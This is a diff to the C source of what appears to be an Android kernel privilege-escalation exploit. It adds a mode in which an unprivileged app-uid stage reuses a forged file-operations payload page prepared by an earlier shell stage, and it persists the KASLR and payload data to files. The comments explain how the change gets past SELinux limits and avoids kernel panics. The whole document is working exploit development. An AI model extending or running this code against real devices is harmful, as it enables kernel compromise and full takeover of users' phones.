@@ -602,6 +602,19 @@ int run_exploit(int argc, char **argv) {
   if (env_truthy("KS_SKIP_PAGE")) {
     pr_warning("KS_SKIP_PAGE: skipping prepare_good_kernel_page (paranoid "
                "write probe does not need the payload page)\n");
+  } else if (env_truthy("KS_PAYLOAD_PASTE")) {
+    /* Exam-2 app-uid rounds: perf/tp are SELinux-denied here, so the
+     * capture oracles and every payload-page verify are dead -- a blind
+     * drain + route lands misc.fops on a garbage page and the first
+     * ashmem open panics (boot b3d9924c).  Take the page verified and
+     * held by a shell round of the SAME boot instead (ks_payload_paste,
+     * boot_id+kaslr gated).  Refuse rather than fall back to the blind
+     * prepare: a wrong table is a kernel panic, not a safe miss. */
+    if (!ks_payload_paste()) {
+      pr_error("payload paste failed; refusing blind route (garbage table "
+               "panics on open)\n");
+      return 1;
+    }
   } else {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   }
@@ -610,6 +623,12 @@ int run_exploit(int argc, char **argv) {
   if (halt_env && halt_env[0]) {
     int halt_secs = atoi(halt_env);
     if (halt_secs > 0 && halt_secs < 3600) {
+      /* Holder mode (exam-2): persist BOTH shared files before parking --
+       * the page is verified here (shell/root oracles) and stays pinned
+       * for the app-uid round to paste; the kaslr file also satisfies its
+       * readyToTrigger gate. */
+      ks_persist_kaslr_file();
+      ks_persist_payload_file();
       pr_success("prepare-halt pid=%d sleep=%d payload alive at page_base=%016zx "
                  "fake_fops=%016zx\n",
                  getpid(), halt_secs, page_base, fake_fops);
